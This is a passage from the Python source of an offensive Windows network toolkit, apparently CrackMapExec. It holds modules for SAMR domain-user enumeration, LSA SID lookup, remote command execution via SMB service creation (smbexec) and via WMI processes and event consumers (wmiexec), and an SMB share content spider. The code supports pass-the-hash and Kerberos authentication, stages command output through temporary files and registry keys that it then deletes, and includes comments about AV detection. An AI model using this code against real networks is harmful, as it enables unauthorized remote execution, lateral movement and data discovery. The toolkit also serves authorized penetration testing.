protocol sequences.\n            rpc_transport.set_credentials(\n                self.__username,\n                self.__password,\n                self.__domain,\n                self.__lmhash,\n                self.__nthash,\n                self.__aesKey,\n            )\n        return rpc_transport\n\n    def get_dce(self):\n        rpc_transport = self.get_transport()\n        try:\n            dce = rpc_transport.get_dce_rpc()\n            if self.__kerberos:\n                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n            dce.connect()\n            dce.bind(lsat.MSRPC_UUID_LSAT)\n        except NetBIOSError as e:\n            self.logger.fail(f""NetBIOSError on Connection: {e}"")\n            return None\n        return dce\n\n    def get_policy_handle(self):\n        resp = lsad.hLsarOpenPolicy2(self.dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)\n        return resp[""PolicyHandle""]\n\n    def lookup_sids(self, sids):\n        resp = lsat.hLsarLookupSids(self.dce, self.policy_handle, sids, lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)\n        names = []\n        for translated_names in resp[""TranslatedNames""][""Names""]:\n            names.append(translated_names[""Name""])\n        return names\n', 'samruser.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# Stolen from Impacket\n\nfrom impacket.dcerpc.v5 import transport, samr\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nfrom impacket.dcerpc.v5.rpcrt import DCERPC_v5\nfrom impacket.nt_errors import STATUS_MORE_ENTRIES\n\n\nclass UserSamrDump:\n    KNOWN_PROTOCOLS = {\n        ""139/SMB"": (r""ncacn_np:%s[\\pipe\\samr]"", 139),\n        ""445/SMB"": (r""ncacn_np:%s[\\pipe\\samr]"", 445),\n    }\n\n    def __init__(self, connection):\n        self.logger = connection.logger\n        self.addr = connection.host if not connection.kerberos else connection.hostname + ""."" + connection.domain\n        self.protocol = connection.args.port\n        self.username = connection.username\n        self.password = connection.password\n        self.domain = connection.domain\n        self.hash = connection.hash\n        self.lmhash = """"\n        self.nthash = """"\n        self.aesKey = connection.aesKey\n        self.doKerberos = connection.kerberos\n        self.protocols = UserSamrDump.KNOWN_PROTOCOLS.keys()\n        self.users = []\n\n        if self.hash is not None:\n            if self.hash.find("":"") != -1:\n                self.lmhash, self.nthash = self.hash.split("":"")\n            else:\n                self.nthash = self.hash\n\n        if self.password is None:\n            self.password = """"\n\n    def dump(self):\n        # Try all requested protocols until one works.\n        for protocol in self.protocols:\n            try:\n                protodef = UserSamrDump.KNOWN_PROTOCOLS[protocol]\n                port = protodef[1]\n            except KeyError as e:\n                self.logger.debug(f""Invalid Protocol \'{protocol}\'"")\n            self.logger.debug(f""Trying protocol {protocol}"")\n            rpctransport = transport.SMBTransport(\n                self.addr,\n                port,\n                r""\\samr"",\n                self.username,\n                self.password,\n                self.domain,\n                self.lmhash,\n                self.nthash,\n                self.aesKey,\n                doKerberos=self.doKerberos,\n            )\n            try:\n                self.fetchList(rpctransport)\n                break\n            except Exception as e:\n                self.logger.debug(f""Protocol failed: {e}"")\n        return self.users\n\n    def fetchList(self, rpctransport):\n        dce = DCERPC_v5(rpctransport)\n        dce.connect()\n        dce.bind(samr.MSRPC_UUID_SAMR)\n\n        # Setup Connection\n        resp = samr.hSamrConnect2(dce)\n        if resp[""ErrorCode""] != 0:\n            raise Exception(""Connect error"")\n\n        resp2 = samr.hSamrEnumerateDomainsInSamServer(\n            dce,\n            serverHandle=resp[""ServerHandle""],\n            enumerationContext=0,\n            preferedMaximumLength=500,\n        )\n        if resp2[""ErrorCode""] != 0:\n            raise Exception(""Connect error"")\n\n        resp3 = samr.hSamrLookupDomainInSamServer(\n            dce,\n            serverHandle=resp[""ServerHandle""],\n            name=resp2[""Buffer""][""Buffer""][0][""Name""],\n        )\n        if resp3[""ErrorCode""] != 0:\n            raise Exception(""Connect error"")\n\n        resp4 = samr.hSamrOpenDomain(\n            dce,\n            serverHandle=resp[""ServerHandle""],\n            desiredAccess=samr.MAXIMUM_ALLOWED,\n            domainId=resp3[""DomainId""],\n        )\n        if resp4[""ErrorCode""] != 0:\n            raise Exception(""Connect error"")\n\n        self.__domains = resp2[""Buffer""][""Buffer""]\n        domainHandle = resp4[""DomainHandle""]\n        # End Setup\n\n        status = STATUS_MORE_ENTRIES\n        enumerationContext = 0\n        while status == STATUS_MORE_ENTRIES:\n            try:\n                resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)\n            except DCERPCException as e:\n                if str(e).find(""STATUS_MORE_ENTRIES"") < 0:\n                    self.logger.fail(""Error enumerating domain user(s)"")\n                    break\n                resp = e.get_packet()\n            self.logger.success(""Enumerated domain user(s)"")\n            for user in resp[""Buffer""][""Buffer""]:\n                r = samr.hSamrOpenUser(dce, domainHandle, samr.MAXIMUM_ALLOWED, user[""RelativeId""])\n                info = samr.hSamrQueryInformationUser2(dce, r[""UserHandle""], samr.USER_INFORMATION_CLASS.UserAllInformation)\n                (username, uid, info_user) = (\n                    user[""Name""],\n                    user[""RelativeId""],\n                    info[""Buffer""][""All""],\n                )\n                self.logger.highlight(f""{self.domain}\\\\{user[\'Name\']:<30} {info_user[\'AdminComment\']}"")\n                self.users.append(user[""Name""])\n                samr.hSamrCloseHandle(dce, r[""UserHandle""])\n\n            enumerationContext = resp[""EnumerationContext""]\n            status = resp[""ErrorCode""]\n\n        dce.disconnect()\n', 'smbexec.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nimport os\nfrom os.path import join as path_join\nfrom time import sleep\nfrom impacket.dcerpc.v5 import transport, scmr\nfrom cme.helpers.misc import gen_random_string\nfrom impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE\n\n\nclass SMBEXEC:\n    def __init__(\n        self,\n        host,\n        share_name,\n        smbconnection,\n        protocol,\n        username="""",\n        password="""",\n        domain="""",\n        doKerberos=False,\n        aesKey=None,\n        kdcHost=None,\n        hashes=None,\n        share=None,\n        port=445,\n        logger=None,\n        tries=None\n    ):\n        self.__host = host\n        self.__share_name = ""C$""\n        self.__port = port\n        self.__username = username\n        self.__password = password\n        self.__serviceName = gen_random_string()\n        self.__domain = domain\n        self.__lmhash = """"\n        self.__nthash = """"\n        self.__share = share\n        self.__smbconnection = smbconnection\n        self.__output = None\n        self.__batchFile = None\n        self.__outputBuffer = b""""\n        self.__shell = ""%COMSPEC% /Q /c ""\n        self.__retOutput = False\n        self.__rpctransport = None\n        self.__scmr = None\n        self.__conn = None\n        # self.__mode  = mode\n        self.__aesKey = aesKey\n        self.__doKerberos = doKerberos\n        self.__kdcHost = kdcHost\n        self.__tries = tries\n        self.logger = logger\n\n        if hashes is not None:\n            # This checks to see if we didn\'t provide the LM Hash\n            if hashes.find("":"") != -1:\n                self.__lmhash, self.__nthash = hashes.split("":"")\n            else:\n                self.__nthash = hashes\n\n        if self.__password is None:\n            self.__password = """"\n\n        stringbinding = ""ncacn_np:%s[\\pipe\\svcctl]"" % self.__host\n        self.logger.debug(""StringBinding %s"" % stringbinding)\n        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)\n        self.__rpctransport.set_dport(self.__port)\n\n        if hasattr(self.__rpctransport, ""setRemoteHost""):\n            self.__rpctransport.setRemoteHost(self.__host)\n        if hasattr(self.__rpctransport, ""set_credentials""):\n            # This method exists only for selected protocol sequences.\n            self.__rpctransport.set_credentials(\n                self.__username,\n                self.__password,\n                self.__domain,\n                self.__lmhash,\n                self.__nthash,\n                self.__aesKey,\n            )\n            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)\n\n        self.__scmr = self.__rpctransport.get_dce_rpc()\n        if self.__doKerberos:\n            self.__scmr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n        self.__scmr.connect()\n        s = self.__rpctransport.get_smb_connection()\n        # We don\'t wanna deal with timeouts from now on.\n        s.setTimeout(100000)\n\n        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)\n        resp = scmr.hROpenSCManagerW(self.__scmr)\n        self.__scHandle = resp[""lpScHandle""]\n\n    def execute(self, command, output=False):\n        self.__retOutput = output\n        if os.path.isfile(command):\n            with open(command) as commands:\n                for c in commands:\n                    self.execute_remote(c.strip())\n        else:\n            self.execute_remote(command)\n        self.finish()\n        return self.__outputBuffer\n\n    def output_callback(self, data):\n        self.__outputBuffer += data\n\n    def execute_remote(self, data):\n        self.__output = gen_random_string(6)\n        self.__batchFile = gen_random_string(6) + "".bat""\n\n        if self.__retOutput:\n            command = self.__shell + ""echo "" + data + f"" ^> \\\\\\\\127.0.0.1\\\\{self.__share_name}\\\\{self.__output} 2^>^&1 > %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c %TEMP%\\{self.__batchFile} & %COMSPEC% /Q /c del %TEMP%\\{self.__batchFile}""\n        else:\n            command = self.__shell + data\n\n        with open(path_join(""/tmp"", ""cme_hosted"", self.__batchFile), ""w"") as batch_file:\n            batch_file.write(command)\n\n        self.logger.debug(""Hosting batch file with command: "" + command)\n\n        # command = self.__shell + \'\\\\\\\\{}\\\\{}\\\\{}\'.format(local_ip,self.__share_name, self.__batchFile)\n        self.logger.debug(""Command to execute: "" + command)\n\n        self.logger.debug(f""Remote service {self.__serviceName} created."")\n        \n        try:\n            resp = scmr.hRCreateServiceW(\n                self.__scmr,\n                self.__scHandle,\n                self.__serviceName,\n                self.__serviceName,\n                lpBinaryPathName=command,\n                dwStartType=scmr.SERVICE_DEMAND_START,\n            )\n            service = resp[""lpServiceHandle""]\n        except Exception as e:\n            if ""rpc_s_access_denied"" in str(e):\n                self.logger.fail(""SMBEXEC: Create services got blocked."")\n            else:\n                self.logger.fail(str(e))\n            \n            return self.__outputBuffer\n\n        try:\n            self.logger.debug(f""Remote service {self.__serviceName} started."")\n            scmr.hRStartServiceW(self.__scmr, service)\n\n            self.logger.debug(f""Remote service {self.__serviceName} deleted."")\n            scmr.hRDeleteService(self.__scmr, service)\n            scmr.hRCloseServiceHandle(self.__scmr, service)\n        except Exception as e:\n            pass\n\n        self.get_output_remote()\n\n    def get_output_remote(self):\n        if self.__retOutput is False:\n            self.__outputBuffer = """"\n            return\n        tries = 1\n        while True:\n            try:\n                self.logger.info(f""Attempting to read {self.__share}\\\\{self.__output}"")\n                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)\n                break\n            except Exception as e:\n                if tries >= self.__tries:\n                    self.logger.fail(f\'SMBEXEC: Get output file error, maybe got detected by AV software, please increase the number of tries with the option ""--get-output-tries"". If it\\\'s still failing maybe something is blocking the schedule job, try another exec method\')\n                    break\n                if str(e).find(""STATUS_BAD_NETWORK_NAME"") >0 :\n                    self.logger.fail(f\'SMBEXEC: Get ouput failed, target has blocked {self.__share} access (maybe command executed!)\')\n                    break\n                if str(e).find(""STATUS_SHARING_VIOLATION"") >= 0 or str(e).find(""STATUS_OBJECT_NAME_NOT_FOUND"") >= 0:\n                    # Output not finished, let\'s wait\n                    sleep(2)\n                    tries += 1\n                else:\n                    self.logger.debug(str(e))\n        \n        if self.__outputBuffer:\n            self.logger.debug(f""Deleting file {self.__share}\\\\{self.__output}"")\n            self.__smbconnection.deleteFile(self.__share, self.__output)\n\n    def execute_fileless(self, data):\n        self.__output = gen_random_string(6)\n        self.__batchFile = gen_random_string(6) + "".bat""\n        local_ip = self.__rpctransport.get_socket().getsockname()[0]\n\n        if self.__retOutput:\n            command = self.__shell + data + f"" ^> \\\\\\\\{local_ip}\\\\{self.__share_name}\\\\{self.__output}""\n        else:\n            command = self.__shell + data\n\n        with open(path_join(""/tmp"", ""cme_hosted"", self.__batchFile), ""w"") as batch_file:\n            batch_file.write(command)\n\n        self.logger.debug(""Hosting batch file with command: "" + command)\n\n        command = self.__shell + f""\\\\\\\\{local_ip}\\\\{self.__share_name}\\\\{self.__batchFile}""\n        self.logger.debug(""Command to execute: "" + command)\n\n        self.logger.debug(f""Remote service {self.__serviceName} created."")\n        resp = scmr.hRCreateServiceW(\n            self.__scmr,\n            self.__scHandle,\n            self.__serviceName,\n            self.__serviceName,\n            lpBinaryPathName=command,\n            dwStartType=scmr.SERVICE_DEMAND_START,\n        )\n        service = resp[""lpServiceHandle""]\n\n        try:\n            self.logger.debug(f""Remote service {self.__serviceName} started."")\n            scmr.hRStartServiceW(self.__scmr, service)\n        except:\n            pass\n        self.logger.debug(f""Remote service {self.__serviceName} deleted."")\n        scmr.hRDeleteService(self.__scmr, service)\n        scmr.hRCloseServiceHandle(self.__scmr, service)\n        self.get_output_fileless()\n\n    def get_output_fileless(self):\n        if not self.__retOutput:\n            return\n\n        while True:\n            try:\n                with open(path_join(""/tmp"", ""cme_hosted"", self.__output), ""rb"") as output:\n                    self.output_callback(output.read())\n                break\n            except IOError:\n                sleep(2)\n\n    def finish(self):\n        # Just in case the service is still created\n        try:\n            self.__scmr = self.__rpctransport.get_dce_rpc()\n            self.__scmr.connect()\n            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)\n            resp = scmr.hROpenSCManagerW(self.__scmr)\n            self.__scHandle = resp[""lpScHandle""]\n            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)\n            service = resp[""lpServiceHandle""]\n            scmr.hRDeleteService(self.__scmr, service)\n            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)\n            scmr.hRCloseServiceHandle(self.__scmr, service)\n        except:\n            pass\n', 'smbspider.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom time import strftime, localtime\nfrom cme.protocols.smb.remotefile import RemoteFile\nfrom impacket.smb3structs import FILE_READ_DATA\nfrom impacket.smbconnection import SessionError\nimport re\nimport traceback\n\n\nclass SMBSpider:\n    def __init__(self, smbconnection, logger):\n        self.smbconnection = smbconnection\n        self.logger = logger\n        self.share = None\n        self.regex = []\n        self.pattern = []\n        self.folder = None\n        self.exclude_dirs = []\n        self.onlyfiles = True\n        self.content = False\n        self.results = []\n\n    def spider(\n        self,\n        share,\n        folder=""."",\n        pattern=[],\n        regex=[],\n        exclude_dirs=[],\n        depth=None,\n        content=False,\n        onlyfiles=True,\n    ):\n        if regex:\n            try:\n                self.regex = [re.compile(bytes(rx, ""utf8"")) for rx in regex]\n            except Exception as e:\n                self.logger.fail(f""Regex compilation error: {e}"")\n\n        self.folder = folder\n        self.pattern = pattern\n        self.exclude_dirs = exclude_dirs\n        self.content = content\n        self.onlyfiles = onlyfiles\n\n        if share == ""*"":\n            self.logger.display(""Enumerating shares for spidering"")\n            permissions = []\n            try:\n                for share in self.smbconnection.listShares():\n                    share_name = share[""shi1_netname""][:-1]\n                    share_remark = share[""shi1_remark""][:-1]\n                    try:\n                        self.smbconnection.listPath(share_name, ""*"")\n                        self.share = share_name\n                        self.logger.display(f""Spidering share: {share_name}"")\n                        self._spider(folder, depth)\n                    except SessionError:\n                        pass\n            except Exception as e:\n                self.logger.fail(f""Error enumerating shares: {e}"")\n        else:\n            self.share = share\n            self.logger.display(f""Spidering {folder}"")\n            self._spider(folder, depth)\n\n        return self.results\n\n    def _spider(self, subfolder, depth):\n        """"""\n        Abandon all hope ye who enter here.\n        You\'re now probably wondering if I was drunk and/or high when writing this.\n        Getting this to work took a toll on my sanity. So yes. a lot.\n        """"""\n\n        # The following is some funky shit that deals with the way impacket treats file paths\n\n        if subfolder in ["""", "".""]:\n            subfolder = ""*""\n\n        elif subfolder.startswith(""*/""):\n            subfolder = subfolder[2:] + ""/*""\n        else:\n            subfolder = subfolder.replace(""/*/"", ""/"") + ""/*""\n\n        # End of the funky shit... or is it? Surprise! This whole thing is funky\n\n        filelist = None\n        try:\n            filelist = self.smbconnection.listPath(self.share, subfolder)\n            self.dir_list(filelist, subfolder)\n            if depth == 0:\n                return\n        except SessionError as e:\n            if not filelist:\n                if ""STATUS_ACCESS_DENIED"" not in str(e):\n                    self.logger.debug(f""Failed listing files on share {self.share} in directory {subfolder}: {e}"")\n                return\n\n        for result in filelist:\n            if result.is_directory() and result.get_longname() not in [""."", ""..""]:\n                if subfolder == ""*"":\n                    self._spider(\n                        subfolder.replace(""*"", """") + result.get_longname(),\n                        depth - 1 if depth else None,\n                    )\n                elif subfolder != ""*"" and (subfolder[:-2].split(""/"")[-1] not in self.exclude_dirs):\n                    self._spider(\n                        subfolder.replace(""*"", """") + result.get_longname(),\n                        depth - 1 if depth else None,\n                    )\n        return\n\n    def dir_list(self, files, path):\n        path = path.replace(""*"", """")\n        for result in files:\n            if self.pattern:\n                for pattern in self.pattern:\n                    if bytes(result.get_longname().lower(), ""utf8"").find(bytes(pattern.lower(), ""utf8"")) != -1:\n                        if not self.onlyfiles and result.is_directory():\n                            self.logger.highlight(f""//{self.smbconnection.getRemoteHost()}/{self.share}/{path}{result.get_longname()} [dir]"")\n                        else:\n                            self.logger.highlight(\n                                ""//{}/{}/{}{} [lastm:\'{}\' size:{}]"".format(\n                                    self.smbconnection.getRemoteHost(),\n                                    self.share,\n                                    path,\n                                    result.get_longname(),\n                                    ""n\\\\a"" if not self.get_lastm_time(result) else self.get_lastm_time(result),\n                                    result.get_filesize(),\n                                )\n                            )\n                        self.results.append(f""{path}{result.get_longname()}"")\n            if self.regex:\n                for regex in self.regex:\n                    if regex.findall(bytes(result.get_longname(), ""utf8"")):\n                        if not self.onlyfiles and result.is_directory():\n                            self.logger.highlight(f""//{self.smbconnection.getRemoteHost()}/{self.share}/{path}{result.get_longname()} [dir]"")\n                        else:\n                            self.logger.highlight(\n                                ""//{}/{}/{}{} [lastm:\'{}\' size:{}]"".format(\n                                    self.smbconnection.getRemoteHost(),\n                                    self.share,\n                                    path,\n                                    result.get_longname(),\n                                    ""n\\\\a"" if not self.get_lastm_time(result) else self.get_lastm_time(result),\n                                    result.get_filesize(),\n                                )\n                            )\n                        self.results.append(f""{path}{result.get_longname()}"")\n\n            if self.content:\n                if not result.is_directory():\n                    self.search_content(path, result)\n\n        return\n\n    def search_content(self, path, result):\n        path = path.replace(""*"", """")\n        try:\n            rfile = RemoteFile(\n                self.smbconnection,\n                path + result.get_longname(),\n                self.share,\n                access=FILE_READ_DATA,\n            )\n            rfile.open()\n\n            while True:\n                try:\n                    contents = rfile.read(4096)\n                    if not contents:\n                        break\n                except SessionError as e:\n                    if ""STATUS_END_OF_FILE"" in str(e):\n                        break\n\n                except Exception:\n                    traceback.print_exc()\n                    break\n                if self.pattern:\n                    for pattern in self.pattern:\n                        if contents.lower().find(bytes(pattern.lower(), ""utf8"")) != -1:\n                            self.logger.highlight(\n                                ""//{}/{}/{}{} [lastm:\'{}\' size:{} offset:{} pattern:\'{}\']"".format(\n                                    self.smbconnection.getRemoteHost(),\n                                    self.share,\n                                    path,\n                                    result.get_longname(),\n                                    ""n\\\\a"" if not self.get_lastm_time(result) else self.get_lastm_time(result),\n                                    result.get_filesize(),\n                                    rfile.tell(),\n                                    pattern,\n                                )\n                            )\n                            self.results.append(f""{path}{result.get_longname()}"")\n                if self.regex:\n                    for regex in self.regex:\n                        if regex.findall(contents):\n                            self.logger.highlight(\n                                ""//{}/{}/{}{} [lastm:\'{}\' size:{} offset:{} regex:\'{}\']"".format(\n                                    self.smbconnection.getRemoteHost(),\n                                    self.share,\n                                    path,\n                                    result.get_longname(),\n                                    ""n\\\\a"" if not self.get_lastm_time(result) else self.get_lastm_time(result),\n                                    result.get_filesize(),\n                                    rfile.tell(),\n                                    regex.pattern,\n                                )\n                            )\n                            self.results.append(f""{path}{result.get_longname()}"")\n\n            rfile.close()\n            return\n\n        except SessionError as e:\n            if ""STATUS_SHARING_VIOLATION"" in str(e):\n                pass\n\n        except Exception:\n            traceback.print_exc()\n\n    def get_lastm_time(self, result_obj):\n        lastm_time = None\n        try:\n            lastm_time = strftime(""%Y-%m-%d %H:%M"", localtime(result_obj.get_mtime_epoch()))\n        except Exception:\n            pass\n\n        return lastm_time\n', 'wmiexec.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n#\n#\n# Author: xiaolichan\n# Link: https://github.com/XiaoliChan/wmiexec-RegOut/blob/main/wmiexec-regOut.py\n# Note: windows version under NT6 not working with this command execution way\n#       https://github.com/XiaoliChan/wmiexec-RegOut/blob/main/wmiexec-reg-sch-UnderNT6-wip.py -- WIP\n# \n# Description: \n#   For more details, please check out my repository.\n#   https://github.com/XiaoliChan/wmiexec-RegOut\n#\n# Workflow:\n#   Stage 1:\n#       cmd.exe /Q /c {command} > C:\\windows\\temp\\{random}.txt (aka command results)\n#       \n#       powershell convert the command results into base64, and save it into C:\\windows\\temp\\{random2}.txt (now the command results was base64 encoded)\n#       \n#       Create registry path: HKLM:\\Software\\Classes\\hello, then add C:\\windows\\temp\\{random2}.txt into HKLM:\\Software\\Classes\\hello\\{NewKey}\n#\n#       Remove anythings which in C:\\windows\\temp\\\n#\n#   Stage 2:\n#       WQL query the HKLM:\\Software\\Classes\\hello\\{NewKey} and get results, after the results(base64 strings) retrieved, removed\n\nimport time\nimport uuid\nimport base64\n\nfrom cme.helpers.misc import gen_random_string\nfrom impacket.dcerpc.v5.dtypes import NULL\nfrom impacket.dcerpc.v5.dcomrt import DCOMConnection\nfrom impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, WBEM_FLAG_FORWARD_ONLY, IWbemLevel1Login\n\nclass WMIEXEC:\n    def __init__(self, host, username, password, domain, lmhash, nthash, doKerberos, kdcHost, aesKey, logger, interval_time, codec):\n        self.__host = host\n        self.__username = username\n        self.__password = password\n        self.__domain = domain\n        self.__lmhash = lmhash\n        self.__nthash = nthash\n        self.__doKerberos = doKerberos\n        self.__kdcHost = kdcHost\n        self.__aesKey = aesKey\n        self.logger = logger\n        self.__interval_time = interval_time\n        self.__registry_Path = """"\n        self.__outputBuffer = """"\n        self.__retOutput = True\n\n        self.__shell = \'cmd.exe /Q /c \'\n        #self.__pwsh = \'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc \'\n        #self.__pwsh = \'powershell.exe -Enc \'\n        self.__pwd = str(\'C:\\\\\')\n        self.__codec = codec\n\n        self.__dcom = DCOMConnection(self.__host, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, oxidResolver=True, doKerberos=self.__doKerberos ,kdcHost=self.__kdcHost, aesKey=self.__aesKey)\n        iInterface = self.__dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)\n        iWbemLevel1Login = IWbemLevel1Login(iInterface)\n        self.__iWbemServices = iWbemLevel1Login.NTLMLogin(\'//./root/cimv2\', NULL, NULL)\n        iWbemLevel1Login.RemRelease()\n        self.__win32Process, _ = self.__iWbemServices.GetObject(\'Win32_Process\')\n        \n    def execute(self, command, output=False):\n        self.__retOutput = output\n        if self.__retOutput:\n            self.execute_WithOutput(command)\n        else:\n            command = self.__shell + command\n            self.execute_remote(command)\n\n        self.__dcom.disconnect()\n\n        return self.__outputBuffer\n\n    def execute_remote(self, command):\n        self.logger.info(f""Executing command: {command}"")\n        try:\n            self.__win32Process.Create(command, self.__pwd, None)\n        except Exception as e:\n            self.logger.error((str(e)))\n\n    def execute_WithOutput(self, command):\n        result_output = f""C:\\\\windows\\\\temp\\\\{str(uuid.uuid4())}.txt""\n        result_output_b64 = f""C:\\\\windows\\\\temp\\\\{str(uuid.uuid4())}.txt""\n        keyName = str(uuid.uuid4())\n        self.__registry_Path = f""Software\\\\Classes\\\\{gen_random_string(6)}""\n\n        command = fr\'\'\'{self.__shell} {command} 1> {result_output} 2>&1 && certutil -encodehex -f {result_output} {result_output_b64} 0x40000001 && for /F ""usebackq"" %G in (""{result_output_b64}"") do reg add HKLM\\{self.__registry_Path} /v {keyName} /t REG_SZ /d ""%G"" /f && del /q /f /s {result_output} {result_output_b64}\'\'\'\n\n        self.execute_remote(command)\n        self.logger.info(""Waiting {}s for command completely executed."".format(self.__interval_time))\n        time.sleep(self.__interval_time)\n\n        self.queryRegistry(keyName)\n\n    def queryRegistry(self, keyName):\n        try:\n            self.logger.debug(f""Querying registry key: HKLM\\\\{self.__registry_Path}"")\n            descriptor, _ = self.__iWbemServices.GetObject(\'StdRegProv\')\n            descriptor = descriptor.SpawnInstance()\n            retVal = descriptor.GetStringValue(2147483650, self.__registry_Path, keyName)\n            self.__outputBuffer = base64.b64decode(retVal.sValue).decode(self.__codec, errors=\'replace\').rstrip(\'\\r\\n\')\n        except Exception as e:\n            self.logger.fail(f\'WMIEXEC: Get output file error, maybe command not executed successfully or got detected by AV software, please increase the interval time of command execution with ""--interval-time"" option. If it\\\'s still failing maybe something is blocking the schedule job in vbscript, try another exec method\')\n        \n        try:\n            self.logger.debug(f""Removing temporary registry path: HKLM\\\\{self.__registry_Path}"")\n            retVal = descriptor.DeleteKey(2147483650, self.__registry_Path)\n        except Exception as e:\n            self.logger.debug(f""Target: {self.__host} removing temporary registry path error: {str(e)}"")', 'wmiexec_event.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n#\n#\n# Author: xiaolichan\n# Link: https://github.com/XiaoliChan/wmiexec-Pro\n# Note: windows version under NT6 not working with this command execution way, it need Win32_ScheduledJob.\n#       https://github.com/XiaoliChan/wmiexec-Pro/blob/main/lib/modules/exec_command.py\n# \n# Description: \n#   For more details, please check out my repository.\n#   https://github.com/XiaoliChan/wmiexec-Pro/blob/main/lib/modules/exec_command.py\n#\n# Workflow:\n#   Stage 1:\n#       Generate vbs with command.\n#\n#   Stage 2:\n#       Execute vbs via wmi event, the vbs will write back the command result into new instance in ActiveScriptEventConsumer.Name=""{command_ResultInstance}""\n#\n#   Stage 3:\n#       Get result from reading wmi object ActiveScriptEventConsumer.Name=""{command_ResultInstance}""\n#\n#   Stage 4:\n#       Remove everythings in wmi object\n\nimport time\nimport uuid\nimport base64\nimport sys\n\nfrom io import StringIO\nfrom cme.helpers.powershell import get_ps_script\nfrom impacket.dcerpc.v5.dtypes import NULL\nfrom impacket.dcerpc.v5.dcomrt import DCOMConnection\nfrom impacket.dcerpc.v5.dcom.wmi import WBEMSTATUS\nfrom impacket.dcerpc.v5.dcom.wmi import CLSID_WbemLevel1Login, IID_IWbemLevel1Login, WBEM_FLAG_FORWARD_ONLY, IWbemLevel1Login, WBEMSTATUS\n\nclass WMIEXEC_EVENT:\n    def __init__(self, host, username, password, domain, lmhash, nthash, doKerberos, kdcHost, aesKey, logger, interval_time, codec):\n        self.__host = host\n        self.__username = username\n        self.__password = password\n        self.__domain = domain\n        self.__lmhash = lmhash\n        self.__nthash = nthash\n        self.__doKerberos = doKerberos\n        self.__kdcHost = kdcHost\n        self.__aesKey = aesKey\n        self.__outputBuffer = """"\n        self.__retOutput = True\n        \n        self.logger = logger\n        self.__interval_time = interval_time\n        self.__codec = codec\n        self.__instanceID = f""windows-object-{str(uuid.uuid4())}""\n        self.__instanceID_StoreResult = f""windows-object-{str(uuid.uuid4())}""\n\n        self.__dcom = DCOMConnection(self.__host, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, oxidResolver=True, doKerberos=self.__doKerberos ,kdcHost=self.__kdcHost, aesKey=self.__aesKey)\n        iInterface = self.__dcom.CoCreateInstanceEx(CLSID_WbemLevel1Login, IID_IWbemLevel1Login)\n        iWbemLevel1Login = IWbemLevel1Login(iInterface)\n        self.__iWbemServices = iWbemLevel1Login.NTLMLogin(\'//./root/subscription\', NULL, NULL)\n        iWbemLevel1Login.RemRelease()\n\n    def execute(self, command, output=False):\n        if ""\'"" in command: command = command.replace(""\'"",r\'""\')\n        self.__retOutput = output\n        self.execute_handler(command)\n\n        self.__dcom.disconnect()\n\n        return self.__outputBuffer\n\n    def execute_remote(self, command):\n        self.logger.info(f""Executing command: {command}"")\n        try:\n            self.execute_vbs(self.process_vbs(command))\n        except Exception as e:\n            self.logger.error((str(e)))\n\n    def execute_handler(self, command):\n        # Generate vbsript and execute it\n        self.logger.debug(f""{self.__host}: Execute command via wmi event, job instance id: {self.__instanceID}, command result instance id: {self.__instanceID_StoreResult}"")\n        self.execute_remote(command)\n        \n        # Get command results\n        self.logger.info(""Waiting {}s for command completely executed."".format(self.__interval_time))\n        time.sleep(self.__interval_time)\n\n        if self.__retOutput:\n            self.get_CommandResult()\n\n        # Clean up\n        self.remove_Instance()\n\n    def process_vbs(self, command):\n        schedule_taskname = str(uuid.uuid4())\n        # Link: https://github.com/XiaoliChan/wmiexec-Pro/blob/main/lib/vbscripts/Exec-Command-WithOutput.vbs\n        # The reason why need to encode command to base64:\n        #   because if some special charters in command like chinese,\n        #   when wmi doing put instance, it will throwing a exception about data type error (lantin-1),\n        #   but we can base64 encode it and submit the data without spcial charters to avoid it.\n        if self.__retOutput:\n            output_file = f""{str(uuid.uuid4())}.txt""\n            with open(get_ps_script(""wmiexec_event_vbscripts/Exec_Command_WithOutput.vbs""), ""r"") as vbs_file:\n                vbs = vbs_file.read()\n            vbs = vbs.replace(""REPLACE_ME_BASE64_COMMAND"", base64.b64encode(command.encode()).decode())\n            vbs = vbs.replace(""REPLACE_ME_OUTPUT_FILE"", output_file)\n            vbs = vbs.replace(""REPLACE_ME_INSTANCEID"", self.__instanceID_StoreResult)\n            vbs = vbs.replace(""REPLACE_ME_TEMP_TASKNAME"", schedule_taskname)\n        else:\n            # From wmihacker\n            # Link: https://github.com/rootclay/WMIHACKER/blob/master/WMIHACKER_0.6.vbs\n            with open(get_ps_script(""wmiexec_event_vbscripts/Exec_Command_Silent.vbs""), ""r"") as vbs_file:\n                vbs = vbs_file.read()\n            vbs = vbs.replace(""REPLACE_ME_BASE64_COMMAND"", base64.b64encode(command.encode()).decode())\n            vbs = vbs.replace(""REPLACE_ME_TEMP_TASKNAME"", schedule_taskname)\n        return vbs\n\n    def checkError(self, banner, call_status):\n        if call_status != 0:\n            try:\n                error_name = WBEMSTATUS.enumItems(call_status).name\n            except ValueError:\n                error_name = \'Unknown\'\n            